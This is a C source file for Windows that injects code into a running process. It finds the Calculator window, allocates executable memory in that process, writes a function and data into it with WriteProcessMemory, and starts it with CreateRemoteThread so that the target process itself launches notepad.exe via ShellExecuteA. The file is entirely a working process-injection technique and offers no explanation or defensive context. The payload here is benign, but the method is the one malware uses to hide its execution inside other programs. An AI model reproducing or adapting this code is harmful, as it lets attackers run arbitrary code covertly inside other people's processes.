#include <windows.h>

typedef HMODULE(WINAPI * RemoteFunction)(LPCTSTR lpFileName);
typedef HINSTANCE(WINAPI * RemoteFunction2)(HWND hwnd, LPCTSTR lpOperation, LPCTSTR lpFile, LPCTSTR lpParameters, LPCTSTR lpDirectory, INT nShowCmd);

struct RemoteFunctionData
{
    RemoteFunction RemoteFunctionAddr;
    RemoteFunction2 RemoteFunctionAddr2;
    char Content[256],libShell[15],aOpen[15];
};

typedef struct RemoteFunctionData StructRemoteData;

void RemoteCode(StructRemoteData * Data)
{
    Data->RemoteFunctionAddr(Data->libShell);
    Data->RemoteFunctionAddr2(NULL, Data->aOpen, Data->Content, NULL, NULL, 1);
}

void Inject(DWORD PID, char* Content)
{
    StructRemoteData Data, *RemoteDataAddr;

    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, PID);

    Data.RemoteFunctionAddr2 = (RemoteFunction2)GetProcAddress(GetModuleHandle("Shell32.dll"), "ShellExecuteA");
    
    Data.RemoteFunctionAddr = (RemoteFunction)GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA");
    strcpy(Data.Content, Content),strcpy(Data.aOpen, "Open"),strcpy(Data.libShell, "Shell32.dll");

    RemoteDataAddr = (StructRemoteData*)VirtualAllocEx(hProcess, 0, sizeof(StructRemoteData), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProcess, RemoteDataAddr, &Data, sizeof(StructRemoteData), NULL);

    DWORD FuncSize = (DWORD)Inject - (DWORD)RemoteCode;

    void * FuncAddr = VirtualAllocEx(hProcess, 0, FuncSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, FuncAddr, (void*)RemoteCode, FuncSize, NULL);

    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)FuncAddr, RemoteDataAddr, 0, NULL);

    WaitForSingleObject(hRemoteThread, INFINITE);
    CloseHandle(hRemoteThread);

    VirtualFreeEx(hProcess, FuncAddr, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, RemoteDataAddr, 0, MEM_RELEASE);

    CloseHandle(hProcess);
}

int main()
{
    DWORD PID;
    HWND hWnd;
 
    //LoadLibrary("Shell32.dll");
    hWnd = FindWindow(NULL, "Calculator");
    if(hWnd!=NULL)
    {
        GetWindowThreadProcessId(hWnd, &PID);
        Inject(PID, "notepad.exe");
    }

    return 0;
}

